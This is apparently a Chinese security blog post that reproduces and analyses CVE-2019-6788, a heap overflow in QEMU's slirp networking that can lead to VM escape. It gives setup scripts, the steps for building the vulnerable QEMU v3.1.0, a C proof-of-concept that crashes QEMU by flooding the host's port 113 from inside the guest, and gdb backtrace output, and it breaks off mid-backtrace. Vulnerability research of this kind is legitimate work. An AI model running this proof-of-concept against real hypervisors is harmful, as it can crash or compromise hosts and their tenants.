<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="CVE-2019-6788 Qemu逃逸漏洞复现与分析前言CVE-2019-6788是一个QEMU的堆溢出漏洞，本篇文章基于raycp师傅的分析复现，中间补充一些细节方便自己理解。 环境搭建手里有GEEKPWN2020决赛的一道qemu的题目，那道题是改的这个CVE，因此我直接拿过来用了，不过对比了一下它和raycp师傅的脚本，发现没什么区别，估计也是出题人直接拿来用的。 下面是创建文件系统的脚本">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2019-6788 Qemu逃逸漏洞复现与分析">
<meta property="og:url" content="http://ama2in9.top/2021/01/02/cve-2019-6788/index.html">
<meta property="og:site_name" content="Ama2in9">
<meta property="og:description" content="CVE-2019-6788 Qemu逃逸漏洞复现与分析前言CVE-2019-6788是一个QEMU的堆溢出漏洞，本篇文章基于raycp师傅的分析复现，中间补充一些细节方便自己理解。 环境搭建手里有GEEKPWN2020决赛的一道qemu的题目，那道题是改的这个CVE，因此我直接拿过来用了，不过对比了一下它和raycp师傅的脚本，发现没什么区别，估计也是出题人直接拿来用的。 下面是创建文件系统的脚本">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/1.jpg">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/4.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/5.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/2.jpg">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/3.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/6.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/8.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/9.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/10.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/11.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/12.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/13.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/14.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/7.png">
<meta property="og:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/15.png">
<meta property="og:updated_time" content="2021-01-02T11:02:12.108Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CVE-2019-6788 Qemu逃逸漏洞复现与分析">
<meta name="twitter:description" content="CVE-2019-6788 Qemu逃逸漏洞复现与分析前言CVE-2019-6788是一个QEMU的堆溢出漏洞，本篇文章基于raycp师傅的分析复现，中间补充一些细节方便自己理解。 环境搭建手里有GEEKPWN2020决赛的一道qemu的题目，那道题是改的这个CVE，因此我直接拿过来用了，不过对比了一下它和raycp师傅的脚本，发现没什么区别，估计也是出题人直接拿来用的。 下面是创建文件系统的脚本">
<meta name="twitter:image" content="http://ama2in9.top/2021/01/02/cve-2019-6788/1.jpg">






  <link rel="canonical" href="http://ama2in9.top/2021/01/02/cve-2019-6788/"/>



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>CVE-2019-6788 Qemu逃逸漏洞复现与分析 | Ama2in9</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Ama2in9</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br />About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br />Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
  </li>

      
      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />Search</a>
        </li>
      
    </ul>
  

  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="Searching..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ama2in9.top/2021/01/02/cve-2019-6788/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ama2in9">
      <meta itemprop="description" content="Seeing how far I have been.">
      <meta itemprop="image" content="/images/head.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ama2in9">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">CVE-2019-6788 Qemu逃逸漏洞复现与分析
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2021-01-02 19:01:55 / Modified: 19:02:12" itemprop="dateCreated datePublished" datetime="2021-01-02T19:01:55+08:00">2021-01-02</time>
            

            
              

              
            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2021/01/02/cve-2019-6788/#comments" itemprop="discussionUrl">
                
                  <span class="post-comments-count disqus-comment-count"
                        data-disqus-identifier="2021/01/02/cve-2019-6788/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2021/01/02/cve-2019-6788/" class="leancloud_visitors" data-flag-title="CVE-2019-6788 Qemu逃逸漏洞复现与分析">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">Views: </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="CVE-2019-6788-Qemu逃逸漏洞复现与分析"><a href="#CVE-2019-6788-Qemu逃逸漏洞复现与分析" class="headerlink" title="CVE-2019-6788 Qemu逃逸漏洞复现与分析"></a>CVE-2019-6788 Qemu逃逸漏洞复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2019-6788是一个QEMU的堆溢出漏洞，本篇文章基于<code>raycp</code>师傅的分析复现，中间补充一些细节方便自己理解。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>手里有GEEKPWN2020决赛的一道qemu的题目，那道题是改的这个CVE，因此我直接拿过来用了，不过对比了一下它和raycp师傅的脚本，发现没什么区别，估计也是出题人直接拿来用的。</p>
<p>下面是创建文件系统的脚本，需要提前装<code>debootstrap</code>，我没挂代理然后挂了一宿才下完2333.当前目录下的<code>ssh/id_rsa</code>为ssh的私钥。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mkdir qemu</span><br><span class="line"></span><br><span class="line">sudo debootstrap --include=openssh-server,curl,tar,gcc,\</span><br><span class="line">libc6-dev,time,strace,sudo,less,psmisc,\</span><br><span class="line">selinux-utils,policycoreutils,checkpolicy,selinux-policy-default \</span><br><span class="line">stretch qemu</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -eux</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Set some defaults and enable promtless ssh to the machine for root.</span></span><br><span class="line">sudo sed -i <span class="string">'/^root/ &#123; s/:x:/::/ &#125;'</span> qemu/etc/passwd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'T0:23:respawn:/sbin/getty -L ttyS0 115200 vt100'</span> | sudo tee -a qemu/etc/inittab</span><br><span class="line"><span class="comment">#printf '\nauto enp0s3\niface enp0s3 inet dhcp\n' | sudo tee -a qemu/etc/network/interfaces</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">'\nallow-hotplug enp0s3\niface enp0s3 inet dhcp\n'</span> | sudo tee -a qemu/etc/network/interfaces</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'debugfs /sys/kernel/debug debugfs defaults 0 0'</span> | sudo tee -a qemu/etc/fstab</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"kernel.printk = 7 4 1 3"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'debug.exception-trace = 0'</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.core.bpf_jit_enable = 1"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.core.bpf_jit_harden = 2"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"net.ipv4.ping_group_range = 0 65535"</span> | sudo tee -a qemu/etc/sysctl.conf</span><br><span class="line"><span class="built_in">echo</span> -en <span class="string">"127.0.0.1\tlocalhost\n"</span> | sudo tee qemu/etc/hosts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"nameserver 8.8.8.8"</span> | sudo tee -a qemu/etc/resolve.conf</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ubuntu"</span> | sudo tee qemu/etc/hostname</span><br><span class="line">sudo mkdir -p qemu/root/.ssh/</span><br><span class="line">rm -rf ssh</span><br><span class="line">mkdir -p ssh</span><br><span class="line">ssh-keygen -f ssh/id_rsa -t rsa -N <span class="string">''</span></span><br><span class="line">cat ssh/id_rsa.pub | sudo tee qemu/root/.ssh/authorized_keys</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Build a disk image</span></span><br><span class="line">dd <span class="keyword">if</span>=/dev/zero of=qemu.img bs=1M seek=2047 count=1</span><br><span class="line">sudo mkfs.ext4 -F qemu.img</span><br><span class="line">sudo mkdir -p /mnt/qemu</span><br><span class="line">sudo mount -o loop qemu.img /mnt/qemu</span><br><span class="line">sudo cp -a qemu/. /mnt/qemu/.</span><br><span class="line">sudo umount /mnt/qemu</span><br></pre></td></tr></table></figure>
<p>启动脚本如下：其中hostfwd做了端口转发，因此我们传输文件可以使用<code>scp -i ./ssh/id_rsa -P2222 ./1 root@localhost:/</code>。内核文件随便找一个就可以。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo ./qemu-system-x86_64 \</span><br><span class="line">	-kernel ./bzImage \</span><br><span class="line">	-append <span class="string">"console=ttyS0 root=/dev/sda rw"</span> \</span><br><span class="line">	-hda ./qemu.img \</span><br><span class="line">	-<span class="built_in">enable</span>-kvm -m 2G -nographic \</span><br><span class="line">	-net user,hostfwd=tcp::2222-:22 -net nic</span><br></pre></td></tr></table></figure>
<p>在github下载qemu的源码，切换到漏洞版本，编译即可。这里直接搬运raycp师傅的命令。如果觉得慢，可以拿<code>hub.fastgit.org</code>替换<code>github.com</code>然后走https clone。下面的configure开启了调试，因而最后的bin文件包含符号表。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v3.1.0</span><br><span class="line">mkdir -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --<span class="built_in">enable</span>-debug --<span class="built_in">disable</span>-werror</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>
<p>本漏洞复现于ubuntu 18.04，gcc的版本如下。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">wz@wz-virtual-machine:~/Desktop/CTF/CVE-2019-6788/start_qemu$ gcc -v</span><br><span class="line">Using built-in specs.</span><br><span class="line">COLLECT_GCC=gcc</span><br><span class="line">COLLECT_LTO_WRAPPER=/usr/lib/gcc/x86_64-linux-gnu/7/lto-wrapper</span><br><span class="line">OFFLOAD_TARGET_NAMES=nvptx-none</span><br><span class="line">OFFLOAD_TARGET_DEFAULT=1</span><br><span class="line">Target: x86_64-linux-gnu</span><br><span class="line">Configured with: ../src/configure -v --with-pkgversion=<span class="string">'Ubuntu 7.5.0-3ubuntu1~18.04'</span> --with-bugurl=file:///usr/share/doc/gcc-7/README.Bugs --<span class="built_in">enable</span>-languages=c,ada,c++,go,brig,d,fortran,objc,obj-c++ --prefix=/usr --with-gcc-major-version-only --program-suffix=-7 --program-prefix=x86_64-linux-gnu- --<span class="built_in">enable</span>-shared --<span class="built_in">enable</span>-linker-build-id --libexecdir=/usr/lib --without-included-gettext --<span class="built_in">enable</span>-threads=posix --libdir=/usr/lib --<span class="built_in">enable</span>-nls --<span class="built_in">enable</span>-bootstrap --<span class="built_in">enable</span>-clocale=gnu --<span class="built_in">enable</span>-libstdcxx-debug --<span class="built_in">enable</span>-libstdcxx-time=yes --with-default-libstdcxx-abi=new --<span class="built_in">enable</span>-gnu-unique-object --<span class="built_in">disable</span>-vtable-verify --<span class="built_in">enable</span>-libmpx --<span class="built_in">enable</span>-plugin --<span class="built_in">enable</span>-default-pie --with-system-zlib --with-target-system-zlib --<span class="built_in">enable</span>-objc-gc=auto --<span class="built_in">enable</span>-multiarch --<span class="built_in">disable</span>-werror --with-arch-32=i686 --with-abi=m64 --with-multilib-list=m32,m64,mx32 --<span class="built_in">enable</span>-multilib --with-tune=generic --<span class="built_in">enable</span>-offload-targets=nvptx-none --without-cuda-driver --<span class="built_in">enable</span>-checking=release --build=x86_64-linux-gnu --host=x86_64-linux-gnu --target=x86_64-linux-gnu</span><br><span class="line">Thread model: posix</span><br><span class="line">gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)</span><br></pre></td></tr></table></figure>
<p>启动之后宿主机的ip为<code>10.0.2.2</code>，虚拟机ip为<code>10.0.2.15</code>，由于是持久化的磁盘文件，因此可以使用<code>apt install net-tools</code>安装net-tools来使用ifconfig命令。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>为了确定编译和环境没有问题，我们先打一发poc，poc代码如下，从虚拟机中连接宿主机的113端口，需要先在宿主机中用<code>sudo nc -lvknp 113</code>监听113端口，这里-k参数可以保证端口持续监听，这样就不用每次手动重新启动nc。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s, ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">ip_addr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line">    s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    ip_addr.sin_family = AF_INET;</span><br><span class="line">    ip_addr.sin_addr.s_addr = inet_addr(<span class="string">"10.0.2.2"</span>); <span class="comment">// host IP</span></span><br><span class="line">    ip_addr.sin_port = htons(<span class="number">113</span>);                   <span class="comment">// vulnerable port</span></span><br><span class="line">    ret = connect(s, (struct sockaddr *)&amp;ip_addr, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">'A'</span>, <span class="number">0x500</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        write(s, buf, <span class="number">0x500</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译之后scp传到虚拟机中，执行后qemu崩溃，poc攻击成功。</p>
<p>根据wp将断点断到tcp_emu函数，一直continue直到崩溃产生，打印一下调用栈，</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ bt</span><br><span class="line"><span class="comment">#0  0x000056278dee26be in tcp_emu (so=0x7f57c4012800, m=0x7f57c4023c80) at /home/wz/qemu/slirp/tcp_subr.c:641</span></span><br><span class="line"><span class="comment">#1  0x000056278dedea5c in tcp_input (m=0x7f57c4023c80, iphlen=0x14, inso=0x0, af=0x2) at /home/wz/qemu/slirp/tcp_input.c:571</span></span><br><span class="line"><span class="comment">#2  0x000056278ded5767 in ip_input (m=0x7f57c4023c80)</span></span><br><span class="line">    at /home/wz/qemu/slirp/ip_input.c:206</span><br><span class="line"><span class="comment">#3  0x000056278ded8cb8 in slirp_input (slirp=0x56279009d400, pkt=0x5627910329b0 "RU\n", pkt_len=0x536)</span></span><br><span class="line">    at /home/wz/qemu/slirp/slirp.c:876</span><br><span class="line"><span class="comment">#4  0x000056278dec0eec in net_slirp_receive (nc=0x56279009d1d0, buf=0x5627910329b0 "RU\n", size=0x536)</span></span><br><span class="line">    at /home/wz/qemu/net/slirp.c:113</span><br><span class="line"><span class="comment">#5  0x000056278deb68c6 in nc_sendv_compat (nc=0x56279009d1d0, iov=0x7f57cce95bd0, iovcnt=0x1, flags=0x0)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:706</span><br><span class="line"><span class="comment">#6  0x000056278deb6988 in qemu_deliver_packet_iov (sender=0x56279009cb90, flags=0x0, iov=0x7f57cce95bd0, iovcnt=0x1, opaque=0x5627900</span></span><br><span class="line">9d1d0) at /home/wz/qemu/net/net.c:734</span><br><span class="line"><span class="comment">#7  0x000056278deb9541 in qemu_net_queue_deliver_iov (queue=0x56279009d3c0, sender=0x56279009cb90, flags=0x0, iov=0x7f57cce95bd0, iov</span></span><br><span class="line">cnt=0x1) at /home/wz/qemu/net/queue.c:179</span><br><span class="line"><span class="comment">#8  0x000056278deb96b0 in qemu_net_queue_send_iov (queue=0x56279009d3c0, sender=0x56279009cb90, flags=0x0, iov=0x7f57cce95bd0, iovcnt</span></span><br><span class="line">=0x1, sent_cb=0x0) at /home/wz/qemu/net/queue.c:224</span><br><span class="line"><span class="comment">#9  0x000056278deb6acd in qemu_sendv_packet_async (sender=0x56279009cb90, iov=0x7f57cce95bd0, iovcnt=0x1, sent_cb=0x0)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:775</span><br><span class="line"><span class="comment">#10 0x000056278deb6afa in qemu_sendv_packet (nc=0x56279009cb90, iov=0x7f57cce95bd0, iovcnt=0x1) at /home/wz/qemu/net/net.c:783</span></span><br><span class="line"><span class="comment">#11 0x000056278deba0d1 in net_hub_receive_iov (hub=0x56279009c9c0, source_port=0x56279009cf70, iov=0x7f57cce95bd0, iovcnt=0x1)</span></span><br><span class="line">    at /home/wz/qemu/net/hub.c:74</span><br><span class="line"><span class="comment">#12 0x000056278deba2cb in net_hub_port_receive_iov (nc=0x56279009cf70, iov=0x7f57cce95bd0, iovcnt=0x1)</span></span><br><span class="line">    at /home/wz/qemu/net/hub.c:125</span><br><span class="line"><span class="comment">#13 0x000056278deb696d in qemu_deliver_packet_iov (sender=0x5627910449a0, flags=0x0, iov=0x7f57cce95bd0, iovcnt=0x1, opaque=0x5627900</span></span><br><span class="line">9cf70) at /home/wz/qemu/net/net.c:732</span><br><span class="line"><span class="comment">#14 0x000056278deb94c5 in qemu_net_queue_deliver (queue=0x56279009d110, sender=0x5627910449a0, flags=0x0, data=0x5627910329b0 "RU\n", size=0x536) at /home/wz/qemu/net/queue.c:164</span></span><br><span class="line"><span class="comment">#15 0x000056278deb95e1 in qemu_net_queue_send (queue=0x56279009d110, sender=0x5627910449a0, flags=0x0, data=0x5627910329b0 "RU\n", si</span></span><br><span class="line">ze=0x536, sent_cb=0x0) at /home/wz/qemu/net/queue.c:199</span><br><span class="line"><span class="comment">#16 0x000056278deb672d in qemu_send_packet_async_with_flags (sender=0x5627910449a0, flags=0x0, buf=0x5627910329b0 "RU\n", size=0x536,</span></span><br><span class="line"> sent_cb=0x0) at /home/wz/qemu/net/net.c:660</span><br><span class="line"><span class="comment">#17 0x000056278deb6765 in qemu_send_packet_async (sender=0x5627910449a0, buf=0x5627910329b0 "RU\n", size=0x536, sent_cb=0x0)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:667</span><br><span class="line"><span class="comment">#18 0x000056278deb6792 in qemu_send_packet (nc=0x5627910449a0, buf=0x5627910329b0 "RU\n", size=0x536)</span></span><br><span class="line">    at /home/wz/qemu/net/net.c:673</span><br><span class="line"><span class="comment">#19 0x000056278dd9989e in e1000_send_packet (s=0x56279100fd00, buf=0x5627910329b0 "RU\n", size=0x536)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:538</span><br><span class="line"><span class="comment">#20 0x000056278dd99d0a in xmit_seg (s=0x56279100fd00)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:601</span><br><span class="line"><span class="comment">#21 0x000056278dd9a23a in process_tx_desc (s=0x56279100fd00, dp=0x7f57cce95e10) at /home/wz/qemu/hw/net/e1000.c:688</span></span><br><span class="line"><span class="comment">#22 0x000056278dd9a432 in start_xmit (s=0x56279100fd00)</span></span><br><span class="line">    at /home/wz/qemu/hw/net/e1000.c:743</span><br><span class="line"><span class="comment">#23 0x000056278dd9b4c8 in set_tctl (s=0x56279100fd00, index=0xe06, val=0x22) at /home/wz/qemu/hw/net/e1000.c:1111</span></span><br><span class="line"><span class="comment">#24 0x000056278dd9b645 in 